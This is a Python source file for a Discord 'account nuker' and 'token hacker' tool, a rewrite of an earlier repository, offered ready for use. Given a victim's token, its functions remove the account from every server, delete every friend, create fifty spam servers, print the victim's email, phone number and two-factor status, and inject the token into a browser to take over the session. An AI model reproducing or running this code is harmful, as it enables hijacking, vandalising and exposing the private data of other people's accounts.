"""
CREDITS:
This code is a rewrite of the following repository:
https://github.com/coats1337/Jajaja-Account-Nuker


I believe this rewrite is necessary as:

1. This rewrite removes features that do not work as of now, such as the disable account feature.
2. Includes required files such as a specific version of chrome and chromewebdriver.exe in the repository all ready.
3. Includes a virtual environment so the users do not need to install any requirements.
"""


from itertools import cycle
from datetime import datetime
from selenium import webdriver
from time import sleep
import threading
import requests
import discord
import random
import time
import os

from colorama import Fore, Style, init
init(convert=True)


user_guilds = []
user_friends = []

def clear():
    os.system('cls')


clear()


class Login(discord.Client):
    async def on_connect(self):
        for guild in self.guilds:
            user_guilds.append(guild.id)

        for friend in self.user.friends:
            user_friends.append(friend.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except:
            print(Fore.RED + "\nInvalid Token.")
            sleep(3)


def login(token):
    webdriver.ChromeOptions.binary_location = r"browser\chrome.exe"
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')


def spy(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f'''
        {Fore.RESET}[{Fore.RED}User ID{Fore.RESET}]         {userID}
        [{Fore.RED}User Name{Fore.RESET}]       {userName}
        [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
        [{Fore.RED}Email{Fore.RESET}]           {email}
        [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
        [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
        choice = str(input(
            f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue . . .  {Fore.LIGHTRED_EX}'))
    else:
        print(f'\n{Fore.RED}Invalid Token.')
        sleep(3)


def accountNuke(token):
    headers = {'Authorization': token}
    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Nuking account. . .")

    for guild in user_guilds:
        requests.delete(
            f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)

    for friend in user_friends:
        requests.delete(
            f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)

    for i in range(50):
        payload = {'name': f'Nuked #{i}', 'region': 'europe',
                   'icon': None, 'channels': None}
        requests.post('https://discord.com/api/v6/guilds',
                      headers=headers, json=payload)


def getBanner():
    banner = Style.BRIGHT + f'''


                                         ██████╗ ███████╗██╗██████╗ ██╗███████╗
                                         ██╔═══██╗██╔════╝██║██╔══██╗██║██╔════╝
                                         ██║   ██║███████╗██║██████╔╝██║███████╗
                                         ██║   ██║╚════██║██║██╔══██╗██║╚════██║
                                         ╚██████╔╝███████║██║██║  ██║██║███████║
                                         ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝╚═╝╚══════╝'''.replace('█', f'{Fore.WHITE}█{Fore.LIGHTGREEN_EX}')+f'''



{Fore.LIGHTGREEN_EX}Original token hacker created by coats1337 (https://github.com/coats1337).

{Fore.YELLOW}[1] {Fore.LIGHTBLUE_EX}Nuke a targetted account.
{Fore.YELLOW}[2] {Fore.LIGHTBLUE_EX}Get information from a targetted account.
{Fore.YELLOW}[3] {Fore.LIGHTBLUE_EX}Log into an account.
{Fore.YELLOW}[4] {Fore.LIGHTBLUE_EX}Exit.{Style.RESET_ALL}
'''
    return banner


def startMenu():
    global contents
    while True:
        clear()
        print(getBanner())
        choice = str(input(
            f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Choice: {Fore.LIGHTRED_EX}'))
        if choice == '1':
            token = str(input(
                f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
            headers = {'Authorization': token, 'Content-Type': 'application/json'}  
            r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
            if r.status_code == 200:
                threads = str(input(
                    f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}No. of threads: {Fore.LIGHTRED_EX}'))
                Login().run(token)
                if threading.active_count() < int(threads):
                    t = threading.Thread(target=accountNuke, args=(token, ))
                    t.start()
            else:
                print(Fore.RED + "\nInvalid Token.")
                sleep(3)

        elif choice == '2':
            token = str(input(
                f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
            spy(token)

        elif choice == '3':
            token = str(input(
                f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
            headers = {'Authorization': token, 'Content-Type': 'application/json'}  
            r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
            if r.status_code == 200:
                login(token)
            else:
                print(Fore.RED + "\nInvalid Token.")
                sleep(3)            

        elif choice == '4':
            choice = str(input(
            f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.LIGHTRED_EX}'))
            if choice.upper() == 'Y':
                exit(0)
            else:
                continue
        else:
            clear()
            continue


if __name__ == "__main__":
    startMenu()
